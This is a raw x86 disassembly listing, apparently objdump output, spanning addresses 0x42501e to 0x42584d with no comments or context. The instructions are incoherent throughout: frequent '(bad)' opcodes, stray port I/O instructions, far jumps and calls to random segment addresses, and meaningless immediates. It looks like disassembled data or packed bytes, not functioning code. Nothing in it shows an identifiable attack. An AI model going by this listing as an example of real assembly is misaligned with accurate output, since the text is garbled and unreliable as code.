  42501e:	or     ebx,DWORD PTR [ecx+0x21]
  425021:	sbb    al,0xde
  425023:	sub    eax,0x4d166ac4
  425028:	mov    dh,0xa2
  42502a:	inc    ebx
  42502b:	js     0x425017
  42502d:	add    DWORD PTR [edi],0x6b9962be
  425033:	(bad)  [eax]
  425035:	sub    dh,BYTE PTR [edx]
  425037:	std    
  425038:	pop    es
  425039:	jne    0x425074
  42503b:	push   cs
  42503c:	add    al,0x74
  42503e:	mov    eax,0xd0801184
  425043:	jmp    0xd941:0x7c7f6806
  42504a:	(bad)  
  42504b:	sbb    eax,0x8afd8a5
  425050:	fimul  WORD PTR ds:0xfe4bc4b7
  425056:	dec    ebp
  425057:	jnp    0x42509e
  425059:	dec    edx
  42505a:	retf   
  42505b:	in     al,dx
  42505c:	push   ss
  42505d:	sbb    esi,DWORD PTR [esi-0x637f5991]
  425063:	pop    edi
  425064:	sar    ah,1
  425066:	mov    edx,0x2e14a834
  42506b:	fisttp WORD PTR [ecx-0x5d]
  42506e:	je     0x42501f
  425070:	pop    edx
  425071:	mov    ch,0xe5
  425073:	lods   al,BYTE PTR ds:[esi]
  425074:	push   ds
  425075:	and    eax,0x791884c2
  42507a:	imul   edx,DWORD PTR [ecx],0x2bd3c3c0
  425080:	sub    esp,DWORD PTR [edi-0x3f7fe395]
  425086:	mov    ch,0x39
  425088:	and    DWORD PTR [ebp+0x291f3de3],0xffffffd0
  42508f:	or     ecx,DWORD PTR [edi-0x5ea20478]
  425095:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425096:	sti    
  425097:	pop    eax
  425098:	mov    ecx,0x399431eb
  42509d:	cmp    ebp,edx
  42509f:	mov    BYTE PTR [ebx],0x36
  4250a2:	cs cmc 
  4250a4:	and    BYTE PTR [eax],al
  4250a6:	mov    ebx,0xc9dbcbf5
  4250ab:	inc    esp
  4250ac:	and    eax,0xa2e82d4f
  4250b1:	jnp    0x4250a5
  4250b3:	sahf   
  4250b4:	xor    ebp,DWORD PTR [ecx+0x5d]
  4250b7:	gs mov al,0x6
  4250ba:	jle    0x4250dc
  4250bc:	and    DWORD PTR [edi-0x6e613e18],ebx
  4250c2:	in     al,dx
  4250c3:	in     eax,dx
  4250c4:	xor    al,0x98
  4250c6:	cli    
  4250c7:	rcr    edi,0xbb
  4250ca:	mov    ah,0x3c
  4250cc:	xchg   ecx,eax
  4250cd:	dec    ecx
  4250ce:	test   DWORD PTR [ebx+esi*4-0x68dc94e3],ebx
  4250d5:	jmp    0x723b:0x998db4b3
  4250dc:	ss sub al,ah
  4250df:	cld    
  4250e0:	(bad)  [edi+0x3b]
  4250e3:	retf   
  4250e4:	inc    edx
  4250e5:	mov    bh,0xb5
  4250e7:	in     al,0x85
  4250e9:	adc    al,0xe1
  4250eb:	outs   dx,DWORD PTR ds:[esi]
  4250ec:	mov    DWORD PTR [esi-0x22],edx
  4250ef:	xchg   ebp,eax
  4250f0:	mov    dl,0xed
  4250f2:	mov    al,0x94
  4250f4:	jb     0x425117
  4250f6:	int3   
  4250f7:	daa    
  4250f8:	xor    ecx,DWORD PTR [ebp-0x4c]
  4250fb:	xchg   esp,eax
  4250fc:	inc    eax
  4250fd:	repz popa 
  4250ff:	clc    
  425100:	cdq    
  425101:	and    eax,0x46e2e3c1
  425106:	mov    ch,0xfc
  425108:	xor    eax,0xad0b3d9b
  42510d:	xchg   dh,ch
  42510f:	adc    al,0x4
  425111:	push   ecx
  425112:	pop    ecx
  425113:	aad    0xa4
  425115:	pop    ebx
  425116:	aam    0x65
  425118:	outs   dx,BYTE PTR es:[esi]
  42511a:	test   al,0x24
  42511c:	push   ecx
  42511d:	sub    edi,DWORD PTR [ebp-0x45ce9197]
  425123:	(bad)  
  425124:	mov    al,0x9d
  425126:	xchg   esi,edx
  425128:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425129:	scas   eax,DWORD PTR es:[edi]
  42512a:	mov    esp,0x7ba81678
  42512f:	jmp    0x4250f0
  425131:	ret    
  425132:	dec    edx
  425133:	fistp  WORD PTR [edi+0x16765fbb]
  425139:	cmp    eax,esi
  42513b:	jae    0x425196
  42513d:	inc    ebp
  42513e:	cmp    al,0x98
  425140:	stos   DWORD PTR es:[edi],eax
  425141:	cdq    
  425142:	jnp    0x42516d
  425144:	sub    al,BYTE PTR [esi+0x109aff12]
  42514a:	mov    dl,0x62
  42514c:	xchg   esi,eax
  42514d:	mov    dh,0xb2
  42514f:	in     al,0x6d
  425151:	cmp    al,0xe7
  425153:	xchg   edx,eax
  425154:	push   esi
  425155:	mov    ds:0xf4ff1d62,al
  42515a:	xchg   BYTE PTR [ebx+0x1b5aef6],ch
  425160:	cmp    DWORD PTR [ecx+0x69ca84b3],ebp
  425166:	sbb    eax,0x18b99c9
  42516b:	mov    dl,0x51
  42516d:	adc    DWORD PTR [ebp-0x568e9394],esi
  425173:	inc    esp
  425174:	sub    BYTE PTR [esi],0xbb
  425177:	inc    esp
  425178:	repz mov bh,0x3e
  42517b:	test   ebp,eax
  42517d:	gs and eax,ebp
  425180:	call   0x2799:0x23c67355
  425187:	push   esi
  425188:	lea    eax,[ecx]
  42518a:	(bad)  
  42518b:	in     eax,dx
  42518c:	cdq    
  42518d:	mov    al,ds:0x742ff5ab
  425192:	and    dl,cl
  425194:	jae    0x425192
  425196:	fbstp  TBYTE PTR [ecx]
  425198:	stc    
  425199:	test   BYTE PTR [eax+ebx*8+0x1c6fa3c9],al
  4251a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4251a1:	cmp    al,0x32
  4251a3:	fs aad 0xc5
  4251a6:	jg     0x42518f
  4251a8:	daa    
  4251a9:	mov    al,BYTE PTR ds:0xa6c91bbf
  4251af:	xchg   DWORD PTR [edi],edx
  4251b1:	add    al,0x69
  4251b3:	pop    esi
  4251b4:	inc    edx
  4251b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4251b6:	dec    ebx
  4251b7:	out    dx,eax
  4251b8:	ror    DWORD PTR [edi+0x3c],0x38
  4251bc:	cli    
  4251bd:	push   es
  4251be:	mul    DWORD PTR [edi+0x52b1169]
  4251c4:	and    al,al
  4251c6:	stc    
  4251c7:	or     cl,BYTE PTR [esi-0x28e10462]
  4251cd:	or     esi,ebx
  4251cf:	and    DWORD PTR [edi-0x542a55c6],eax
  4251d5:	cmc    
  4251d6:	test   al,0xd5
  4251d8:	out    0x95,eax
  4251da:	push   esi
  4251db:	call   0xa8ddee71
  4251e0:	xchg   BYTE PTR ds:0x12f06bc8,bh
  4251e6:	sub    DWORD PTR [eax-0x4b4161fc],0x568c314d
  4251f0:	pop    ss
  4251f1:	xchg   esi,eax
  4251f2:	mov    cl,0xc8
  4251f4:	add    DWORD PTR [edi+edi*1],eax
  4251f7:	out    dx,eax
  4251f8:	pop    esi
  4251f9:	pop    ebp
  4251fa:	cmp    edx,DWORD PTR [esi+0x49]
  4251fd:	lahf   
  4251fe:	mov    ebp,0x137c5964
  425203:	rcl    DWORD PTR [esi-0x16a3e7b8],1
  425209:	mov    dl,0x17
  42520b:	pop    ds
  42520c:	lds    ebp,FWORD PTR [edi+0x54249b28]
  425212:	cli    
  425213:	fisub  DWORD PTR [ecx]
  425215:	sub    DWORD PTR [esi],esp
  425217:	retf   0x35df
  42521a:	mov    ah,0x12
  42521c:	(bad)  ss:[ecx-0x77]
  425221:	bound  esp,QWORD PTR [ecx]
  425223:	fadd   st,st(5)
  425225:	push   0xffffffa9
  425227:	test   DWORD PTR [ecx+0x6c],ecx
  42522a:	adc    edi,eax
  42522c:	cld    
  42522d:	cs mov al,0x54
  425230:	sbb    DWORD PTR [edx-0x1eab4995],esp
  425236:	pop    edi
  425237:	sub    dl,ah
  425239:	xor    al,0x81
  42523b:	push   ebp
  42523c:	fcmovu st,st(0)
  42523e:	mov    eax,ds:0xb5192b89
  425243:	xchg   esp,eax
  425244:	push   fs
  425246:	in     eax,dx
  425247:	push   DWORD PTR [edx-0x69444f24]
  42524d:	pushf  
  42524e:	dec    esp
  42524f:	pop    ds
  425250:	fsub   DWORD PTR ds:0xa33ede66
  425256:	jnp    0x4252c8
  425258:	js     0x42527b
  42525a:	pop    ss
  42525b:	sar    BYTE PTR [ebp+ebx*4+0x55],1
  42525f:	push   ebx
  425260:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425261:	mov    WORD PTR [edx],fs
  425263:	inc    ebp
  425264:	sub    al,0x9
  425266:	add    BYTE PTR [esi],bh
  425268:	fnstcw WORD PTR [eax-0x5a02b5e4]
  42526e:	mov    edx,ebx
  425270:	repnz push ebp
  425272:	mov    eax,ds:0xab44bff
  425277:	mov    ebp,0x84b04e5a
  42527c:	(bad)  
  42527d:	jmp    0x17f7c5e7
  425282:	push   0xffffffee
  425284:	pop    ss
  425285:	outs   dx,BYTE PTR ds:[esi]
  425286:	out    0xcb,eax
  425288:	jecxz  0x425283
  42528a:	mov    bl,0xcf
  42528c:	popa   
  42528d:	jp     0x425273
  42528f:	push   es
  425290:	inc    ebp
  425291:	xlat   BYTE PTR ds:[ebx]
  425292:	sbb    dh,ah
  425294:	xchg   esi,eax
  425295:	fnstenv [ecx]
  425297:	shl    BYTE PTR [edx-0x55],1
  42529a:	fcomp  QWORD PTR [ebx]
  42529c:	adc    edx,ecx
  42529e:	pop    ebx
  42529f:	test   eax,0xcff06735
  4252a4:	inc    esp
  4252a5:	call   0xc4f0:0xf91f80ce
  4252ac:	cs sar ebx,1
  4252af:	cdq    
  4252b0:	gs popf 
  4252b2:	sub    edi,DWORD PTR [eax]
  4252b4:	xchg   ecx,eax
  4252b5:	leave  
  4252b6:	xor    al,0x25
  4252b8:	push   ss
  4252b9:	mov    ds:0x8f1fd2aa,al
  4252be:	mov    es,esi
  4252c0:	push   edi
  4252c1:	sub    bh,ch
  4252c3:	and    BYTE PTR [edx-0x57],ah
  4252c6:	lds    ebp,FWORD PTR [ebx+0x25]
  4252c9:	bound  ebx,QWORD PTR [eax-0x19]
  4252cc:	pop    esp
  4252cd:	inc    eax
  4252ce:	scas   eax,DWORD PTR es:[edi]
  4252cf:	cmp    al,0x1e
  4252d1:	jns    0x42534c
  4252d3:	dec    ecx
  4252d4:	push   ds
  4252d5:	and    BYTE PTR gs:[ebx],0xa0
  4252d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4252da:	stos   DWORD PTR es:[edi],eax
  4252db:	cmp    eax,0xa1235ac6
  4252e0:	imul   edi,DWORD PTR [edi-0x3],0xa85e4544
  4252e7:	mov    ch,0xed
  4252e9:	push   edi
  4252ea:	adc    ch,ch
  4252ec:	add    DWORD PTR [ebx+ebx*1+0x272e7c17],ebx
  4252f3:	sbb    esp,DWORD PTR [edx-0x47]
  4252f6:	inc    ecx
  4252f7:	dec    eax
  4252f8:	out    dx,al
  4252f9:	pop    esi
  4252fa:	mov    bh,0x14
  4252fc:	pop    edi
  4252fd:	(bad)  
  4252fe:	xor    edi,DWORD PTR [ebx+0x65]
  425301:	pop    ds
  425302:	(bad)
  425305:	test   DWORD PTR [ebx+0x36],esi
  425308:	cmp    BYTE PTR [edi-0x58c32787],dh
  42530e:	mov    eax,ds:0x42ac71c5
  425313:	in     al,dx
  425314:	and    BYTE PTR [ebx-0x23da4b35],0xba
  42531b:	xor    ebx,0x5f306172
  425321:	cmp    dh,BYTE PTR [esi+0x77]
  425324:	cmp    al,0x5
  425326:	mov    edi,0x6f25f474
  42532b:	stos   DWORD PTR es:[edi],eax
  42532c:	out    dx,eax
  42532d:	pop    edx
  42532e:	into   
  42532f:	mov    bl,0xcb
  425331:	push   ss
  425332:	sub    eax,0xa33485c4
  425337:	out    0x5b,al
  425339:	cwde   
  42533a:	jl     0x425377
  42533c:	or     eax,0x1594c6b0
  425341:	sbb    edx,0x3b994e92
  425347:	inc    esp
  425348:	adc    BYTE PTR [esp+ebx*2+0x73c4507c],dh
  42534f:	sbb    al,0x2d
  425351:	es mov ch,0xf4
  425354:	adc    eax,0xd71d6d87
  425359:	push   esi
  42535a:	clc    
  42535b:	mov    bl,0x1
  42535d:	mov    ecx,0x91e3e80f
  425362:	add    eax,ebx
  425364:	mov    esp,0xa9d4ef8a
  425369:	sub    ecx,DWORD PTR ss:[ecx-0x68]
  42536d:	call   0xd1d80920
  425372:	inc    esp
  425373:	out    0x69,al
  425375:	hlt    
  425376:	dec    esp
  425377:	lahf   
  425378:	push   ss
  425379:	sbb    DWORD PTR [ebx+0x1f],ebx
  42537c:	ret    
  42537d:	addr16 in eax,dx
  42537f:	pop    ecx
  425380:	push   esi
  425381:	sub    al,0xbf
  425383:	xor    DWORD PTR [edi],ebx
  425385:	shr    DWORD PTR [edx+ebx*8-0x17e58881],0x1e
  42538d:	sbb    DWORD PTR [esi+0x6aa63ae1],ecx
  425393:	sub    DWORD PTR [ebp-0x349b462],eax
  425399:	dec    edx
  42539a:	cmp    al,0xa6
  42539c:	jb     0x425342
  42539e:	cmp    edx,ebp
  4253a0:	fcomp  QWORD PTR [edx+0x2a]
  4253a3:	inc    ebp
  4253a4:	mov    gs,WORD PTR [ecx-0x6c6e4e2f]
  4253aa:	mov    edx,0x5b703579
  4253af:	call   0xe9f0e78a
  4253b4:	add    al,0x3b
  4253b6:	mov    al,0xca
  4253b8:	or     al,dh
  4253ba:	aam    0xc5
  4253bc:	xchg   esp,eax
  4253bd:	mov    ds:0xf1e7cc31,al
  4253c2:	les    edi,FWORD PTR [esi-0x10947b0b]
  4253c8:	xchg   ebp,eax
  4253c9:	mov    esp,0xd94f86c5
  4253ce:	dec    edi
  4253cf:	in     al,dx
  4253d0:	jg     0x4253dc
  4253d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4253d3:	xor    DWORD PTR cs:[eax],0xffffffe8
  4253d7:	imul   edx,DWORD PTR [ebp-0x340f1e10],0xffffffc7
  4253de:	ss aaa 
  4253e0:	sub    DWORD PTR [ecx-0x399574ea],ebp
  4253e6:	inc    edi
  4253e7:	add    ebx,eax
  4253e9:	pop    es
  4253ea:	test   BYTE PTR fs:[ebp-0x6d1a4bbd],dl
  4253f1:	cs inc ebx
  4253f3:	neg    BYTE PTR [ebx]
  4253f5:	jmp    0x7681e553
  4253fa:	arpl   WORD PTR [esi+0x3a],bp
  4253fd:	mov    ds:0x669c13cb,eax
  425402:	scas   eax,DWORD PTR es:[edi]
  425403:	jo     0x42539a
  425405:	repz jmp 0x425398
  425408:	ret    0xb184
  42540b:	inc    esp
  42540c:	xchg   esi,eax
  42540d:	loope  0x42543d
  42540f:	pop    ss
  425410:	dec    ebp
  425411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425412:	sti    
  425413:	xchg   ebp,eax
  425414:	mov    cl,0x68
  425416:	add    eax,0x31e313fe
  42541b:	nop
  42541c:	(bad)  
  42541d:	(bad)  [ebp-0x4b76e27d]
  425423:	sbb    dl,BYTE PTR [edx+0x4632e002]
  425429:	adc    eax,0x2d601dce
  42542e:	adc    ebp,0xffffffc4
  425431:	inc    edx
  425432:	mov    al,0x41
  425434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425435:	outs   dx,DWORD PTR ds:[esi]
  425436:	mov    ebx,0x9906fa44
  42543b:	ss push ebp
  42543d:	xchg   esp,eax
  42543e:	and    ebp,edi
  425440:	repz (bad)
  425443:	mov    ds:0xe3e7b91c,al
  425448:	es add ebp,eax
  42544b:	adc    eax,0x764c1125
  425450:	stos   DWORD PTR es:[edi],eax
  425451:	loope  0x425484
  425453:	in     eax,dx
  425454:	fcomp  DWORD PTR [edx]
  425456:	xor    eax,0xf8cc0bea
  42545b:	cdq    
  42545c:	sbb    eax,0x38b45baf
  425461:	shr    BYTE PTR [ebp-0x7be0be75],0xeb
  425468:	arpl   WORD PTR [ebx-0x45],dx
  42546b:	hlt    
  42546c:	inc    edi
  42546d:	adc    al,0x4f
  42546f:	dec    ecx
  425470:	lds    ebp,FWORD PTR [esi]
  425472:	ja     0x42545c
  425474:	fstp   QWORD PTR [edi-0x6e06d28]
  42547a:	and    eax,0x48315f4d
  42547f:	push   esi
  425480:	or     al,0x9f
  425482:	sbb    edx,ecx
  425484:	loope  0x4254cf
  425486:	jno    0x425448
  425488:	out    0x17,eax
  42548a:	mov    BYTE PTR [edx],bh
  42548c:	sbb    edx,DWORD PTR [ebx]
  42548e:	mov    esp,0xbb9ee35a
  425493:	out    dx,al
  425494:	cmp    eax,0xd43f42b7
  425499:	outs   dx,DWORD PTR ds:[esi]
  42549a:	es cwde 
  42549c:	and    eax,0x4134ba36
  4254a1:	fiadd  DWORD PTR [esi-0x5]
  4254a4:	(bad)  
  4254a7:	mul    BYTE PTR [edi-0x42]
  4254aa:	cmp    DWORD PTR ss:[eax-0x2a16e136],ebx
  4254b1:	pop    edi
  4254b2:	mov    esp,0xb3f75184
  4254b7:	inc    eax
  4254b8:	adc    eax,0x30e51f66
  4254bd:	pop    es
  4254be:	xchg   ebx,eax
  4254bf:	aam    0x90
  4254c1:	test   eax,0x90b499a2
  4254c6:	xor    edx,0xceb52c27
  4254cc:	add    eax,0x93c7759f
  4254d1:	sahf   
  4254d2:	pop    ebx
  4254d3:	jge    0x4254e4
  4254d5:	push   esp
  4254d6:	dec    esp
  4254d7:	add    eax,0x4abdcce1
  4254dc:	sbb    DWORD PTR [esi-0x1ec627a5],ebx
  4254e2:	mov    edx,DWORD PTR [eax-0x2ae463e8]
  4254e8:	popf   
  4254e9:	xchg   ebp,eax
  4254ea:	mov    WORD PTR [ebp-0x15],gs
  4254ed:	std    
  4254ee:	ja     0x4254dd
  4254f0:	gs aaa 
  4254f2:	mov    ebx,0xd8599324
  4254f7:	inc    ecx
  4254f8:	pop    ss
  4254f9:	loop   0x425488
  4254fb:	shld   esp,esi,cl
  4254fe:	jae    0x4254e7
  425500:	push   es
  425501:	inc    edi
  425502:	mov    cl,0x12
  425504:	out    dx,eax
  425505:	mov    cl,0xba
  425507:	xor    al,0x1b
  425509:	popa   
  42550a:	cmc    
  42550b:	test   DWORD PTR ds:0x6ae79583,0x1b2a6544
  425515:	stc    
  425516:	fs jae 0x425549
  425519:	xchg   edi,eax
  42551a:	mov    al,ds:0x7ba5926c
  42551f:	xchg   ebx,eax
  425520:	jnp    0x42559d
  425522:	push   es
  425523:	cmp    ebx,DWORD PTR [ecx]
  425525:	lods   eax,DWORD PTR ds:[esi]
  425526:	fsubr  QWORD PTR [edi+0x193cdcbf]
  42552c:	push   eax
  42552d:	test   al,0x4b
  42552f:	dec    esi
  425530:	call   0x9bd5:0x7a8f5cff
  425537:	or     BYTE PTR [edi],dl
  425539:	out    dx,eax
  42553a:	repz ficomp DWORD PTR [eax*1-0x733d071f]
  425542:	jp     0x425529
  425544:	(bad)  
  425546:	pop    ecx
  425547:	int    0xd3
  425549:	lods   eax,DWORD PTR ds:[esi]
  42554a:	mov    ecx,0x9b99aa84
  42554f:	dec    edi
  425550:	leave  
  425551:	jmp    0x154b7db4
  425556:	pusha  
  425557:	fwait
  425558:	dec    esp
  425559:	repnz aaa 
  42555b:	xlat   BYTE PTR ds:[ebx]
  42555c:	add    al,0x62
  42555e:	mov    eax,0xa4f8d614
  425563:	fbld   TBYTE PTR ds:0xb7e8f2b5
  425569:	jp     0x425501
  42556b:	and    al,0x1b
  42556d:	or     DWORD PTR [edi+0x2059d10d],esi
  425573:	mov    bl,0xa6
  425575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425576:	jmp    0x4255a8
  425578:	(bad)  
  425579:	cmc    
  42557a:	lea    esi,[ecx-0x641ec802]
  425580:	or     bh,BYTE PTR [ebp+ebp*4+0x35]
  425584:	rcl    DWORD PTR [edi-0x5d0812d8],0xbb
  42558b:	loopne 0x425572
  42558d:	bound  ecx,QWORD PTR [edi-0x7a]
  425590:	cmp    ch,BYTE PTR [esi+0x25]
  425593:	push   ebp
  425594:	and    DWORD PTR [ebx+ebp*4],eax
  425597:	inc    ebp
  425598:	mov    bl,0xbe
  42559a:	dec    edx
  42559b:	cmc    
  42559c:	ficom  DWORD PTR [esi+0x3285e351]
  4255a2:	imul   ebp,edx,0x189c78e5
  4255a8:	adc    al,0x7a
  4255aa:	enter  0x3c7e,0xa2
  4255ae:	fwait
  4255af:	mov    ds:0x4b940d94,eax
  4255b4:	jmp    0x6d1d:0x28686fe3
  4255bb:	xor    eax,0xb4b5ec7e
  4255c0:	sbb    eax,0x79fa7d39
  4255c5:	popa   
  4255c6:	bnd jge 0x4255a1
  4255c9:	jp     0x4255d7
  4255cb:	pop    eax
  4255cc:	into   
  4255cd:	dec    ebx
  4255ce:	fild   DWORD PTR [edx-0xcb8a6ea]
  4255d4:	out    dx,eax
  4255d5:	cmp    BYTE PTR [esi-0x7e],ch
  4255d8:	jnp    0x425656
  4255da:	mov    bl,0x54
  4255dc:	and    BYTE PTR [ebp-0x3c],bh
  4255df:	(bad)  
  4255e0:	pop    esp
  4255e1:	outs   dx,BYTE PTR ds:[esi]
  4255e2:	jge    0x4255da
  4255e4:	leave  
  4255e5:	mov    ch,0xef
  4255e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255e8:	sub    ebx,DWORD PTR [edx]
  4255ea:	jl     0x425599
  4255ec:	inc    ecx
  4255ed:	xor    dh,0xf0
  4255f0:	cli    
  4255f1:	fbstp  TBYTE PTR [esp+esi*2+0x340f4054]
  4255f8:	push   ebp
  4255f9:	mov    DWORD PTR [esi-0x27a18c0d],esp
  4255ff:	adc    eax,0x1d85f919
  425604:	xchg   esp,eax
  425605:	ds cmp dh,dl
  425608:	inc    edi
  425609:	mov    ds:0x9b8e8fbb,eax
  42560e:	test   eax,0x7881d943
  425613:	mov    dh,0xd7
  425615:	jle    0x42564e
  425617:	pushf  
  425618:	xchg   ebp,eax
  425619:	ror    BYTE PTR [edx-0x18],1
  42561c:	xchg   esi,eax
  42561d:	retf   
  42561e:	cmp    BYTE PTR [esi],bh
  425620:	lea    eax,gs:[eax+ebp*8]
  425624:	pop    eax
  425625:	adc    bh,bh
  425627:	fsub   DWORD PTR [edx]
  425629:	test   eax,0xba5635
  42562e:	aaa    
  42562f:	jmp    0x5a0dfa25
  425634:	xchg   dh,dl
  425636:	scas   eax,DWORD PTR es:[edi]
  425637:	in     al,0xc
  425639:	pop    ss
  42563a:	(bad)  
  42563b:	mov    bh,0xfd
  42563d:	or     bh,BYTE PTR [esp+esi*2-0x75a67f04]
  425644:	in     eax,0x66
  425646:	cmp    ch,ch
  425648:	cmp    BYTE PTR [ecx+0x9],al
  42564b:	ror    BYTE PTR [ebp+0x40b6bac9],0x6d
  425652:	inc    esp
  425653:	xchg   edi,eax
  425654:	push   ds
  425655:	xor    ch,BYTE PTR [ebx]
  425657:	jmp    0x589df1ac
  42565c:	jb     0x425656
  42565e:	dec    esp
  42565f:	jns    0x425661
  425661:	cdq    
  425662:	(bad)  
  425663:	loope  0x4256a2
  425665:	mov    bl,0xb1
  425667:	adc    al,0x3f
  425669:	fdiv   QWORD PTR [esi]
  42566b:	mov    dh,BYTE PTR [esi]
  42566d:	or     BYTE PTR [edi],dh
  42566f:	mov    ds:0x477cc8d9,al
  425674:	xchg   DWORD PTR [eax-0x605d8b48],edi
  42567a:	sti    
  42567b:	or     eax,0x3af72e1d
  425680:	dec    ecx
  425681:	add    DWORD PTR [eax],edx
  425683:	je     0x425677
  425685:	bt     esp,0x25
  425689:	(bad)  
  42568a:	shr    BYTE PTR [ebp+edx*4-0x64],0x4b
  42568f:	sub    bl,BYTE PTR [edi+0x424c2d65]
  425695:	test   al,0x68
  425697:	dec    esi
  425698:	aam    0x7d
  42569a:	mov    esp,0xdb399ea4
  42569f:	mov    ?,WORD PTR [ecx]
  4256a1:	add    DWORD PTR [edx-0x2d],ecx
  4256a4:	pop    ecx
  4256a5:	mov    bh,BYTE PTR [esp+eax*2+0x6eca7d2e]
  4256ac:	aad    0x1e
  4256ae:	mov    ebp,0x3cff63f4
  4256b3:	sbb    eax,ebp
  4256b5:	dec    esp
  4256b6:	(bad)  
  4256b7:	lock cmc 
  4256b9:	jne    0x42565f
  4256bb:	sbb    al,0x9
  4256bd:	imul   ebx,DWORD PTR [ebx-0x6c],0x22
  4256c1:	rcr    DWORD PTR [esi-0x1c300f65],0x3b
  4256c8:	inc    esi
  4256c9:	sub    eax,0xa7c862d5
  4256ce:	aad    0x55
  4256d0:	ret    0x4909
  4256d3:	pop    ds
  4256d4:	pop    ecx
  4256d5:	or     eax,0x6106a8a4
  4256da:	cld    
  4256db:	rcl    BYTE PTR [ebx],cl
  4256dd:	push   eax
  4256de:	mov    edx,0xb04a064a
  4256e3:	add    dh,dl
  4256e5:	in     al,dx
  4256e6:	add    eax,0xe9bc93be
  4256eb:	jb     0x4256c0
  4256ed:	pop    esp
  4256ee:	inc    ebp
  4256ef:	mov    ah,0x95
  4256f1:	(bad)  [edx]
  4256f3:	cdq    
  4256f4:	mov    ecx,0x20252c4c
  4256f9:	les    edx,FWORD PTR [edx-0x745d0371]
  4256ff:	loope  0x42576f
  425701:	call   0xac3e:0x535ab03f
  425708:	pop    ss
  425709:	hlt    
  42570a:	xchg   esp,eax
  42570b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42570c:	out    dx,al
  42570d:	inc    ebx
  42570e:	fadd   DWORD PTR ss:[ebx]
  425711:	out    dx,al
  425712:	cld    
  425713:	hlt    
  425714:	xchg   ecx,eax
  425715:	cmp    BYTE PTR es:[edi+0x24],cl
  425719:	inc    edi
  42571a:	das    
  42571b:	pop    ebp
  42571c:	sub    eax,0x8a8977f9
  425721:	push   edx
  425722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425723:	dec    edx
  425724:	mov    ds:0x36415928,al
  425729:	call   0x84eb391
  42572e:	mov    ch,0x74
  425730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425731:	shr    BYTE PTR [edi+0x57f516af],cl
  425737:	sub    ah,BYTE PTR ds:0x92d36bb3
  42573d:	mov    ebp,0x2bc874ee
  425742:	mov    al,0x8c
  425744:	dec    ecx
  425745:	mov    ds:0x2afc1740,eax
  42574a:	mov    esp,0x459116a3
  42574f:	dec    ebx
  425750:	mov    edx,0x16d68b45
  425755:	jo     0x425769
  425757:	and    al,0xe0
  425759:	(bad)  
  42575a:	fadd   QWORD PTR [eax+eax*1]
  42575d:	div    BYTE PTR [ecx]
  42575f:	ret    0x6ab5
  425762:	icebp  
  425763:	mov    ah,0x18
  425765:	shr    DWORD PTR [ebx+0x6f5f1424],0x71
  42576c:	jmp    0xeec823a1
  425771:	aaa    
  425772:	call   0x2a04:0xb39e22ca
  425779:	shl    BYTE PTR [esi+0x3b9d367b],1
  42577f:	stos   BYTE PTR es:[edi],al
  425780:	(bad)  
  425781:	cli    
  425782:	call   0x8bdeb9a2
  425787:	inc    ebx
  425788:	sub    BYTE PTR [esi+ebx*8],cl
  42578b:	das    
  42578c:	das    
  42578d:	fs xor al,0x52
  425790:	cmc    
  425791:	dec    edx
  425792:	mov    dl,0x2b
  425794:	pop    ds
  425795:	sbb    ebx,0x6ab50b26
  42579b:	dec    esi
  42579c:	xchg   ebp,eax
  42579d:	jmp    0xdcd7462c
  4257a2:	ins    WORD PTR es:[edi],dx
  4257a4:	fwait
  4257a5:	push   0x4cd26c4
  4257aa:	xlat   BYTE PTR ds:[ebx]
  4257ab:	inc    esp
  4257ac:	pushf  
  4257ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4257ae:	das    
  4257af:	or     ch,BYTE PTR ss:[eax+0x7b1862cb]
  4257b6:	sar    ecx,1
  4257b8:	xor    edi,DWORD PTR [ebx]
  4257ba:	ins    BYTE PTR es:[edi],dx
  4257bb:	retf   
  4257bc:	push   ss
  4257bd:	cdq    
  4257be:	ds pusha 
  4257c0:	adc    eax,0xe8980f0c
  4257c5:	mov    eax,ds:0x2be4238b
  4257ca:	icebp  
  4257cb:	aas    
  4257cc:	mov    ds:0xfad871ae,al
  4257d1:	jge    0x42578f
  4257d3:	xor    al,0x3a
  4257d5:	push   cs
  4257d6:	sbb    esp,DWORD PTR [edi-0xd6193db]
  4257dc:	lds    edi,FWORD PTR [esi-0x1204c68]
  4257e2:	aaa    
  4257e3:	jge    0x4257ba
  4257e5:	inc    ebx
  4257e6:	add    eax,0x974730ed
  4257eb:	cdq    
  4257ec:	mov    ch,0xd3
  4257ee:	nop
  4257ef:	lock fmul DWORD PTR [ebp+ebp*1+0x6c6917c9]
  4257f7:	out    0x55,al
  4257f9:	in     al,0x4
  4257fb:	or     eax,0x47bb6af
  425800:	sub    BYTE PTR [eax-0x67],al
  425803:	fcomp  QWORD PTR [eax-0x66]
  425806:	jle    0x425799
  425808:	and    eax,0x4b53729
  42580d:	push   0x9d8732b6
  425812:	or     edx,DWORD PTR [ecx-0x175bb580]
  425818:	fucomip st,st(3)
  42581a:	in     al,0x90
  42581c:	idiv   BYTE PTR [edx+0x9]
  42581f:	pop    esp
  425820:	and    al,0x41
  425822:	(bad)  [eax+0x30]
  425825:	sbb    dx,WORD PTR [ebx]
  425828:	cmc    
  425829:	mov    ebx,0xd4a9e67b
  42582e:	outs   dx,DWORD PTR ds:[esi]
  42582f:	add    BYTE PTR [edx],ah
  425831:	or     DWORD PTR [ebx+eiz*4-0x7b505f7a],esi
  425838:	ja     0x42586d
  42583a:	xchg   ebx,eax
  42583b:	inc    eax
  42583c:	cwde   
  42583d:	pushf  
  42583e:	xor    DWORD PTR [ebx-0xfe8addb],esi
  425844:	add    DWORD PTR [edx+0x5b],esp
  425847:	push   ss
  425848:	adc    esp,DWORD PTR [esi-0x46]
  42584b:	aam    0xc3
  42584d:	dec    esp
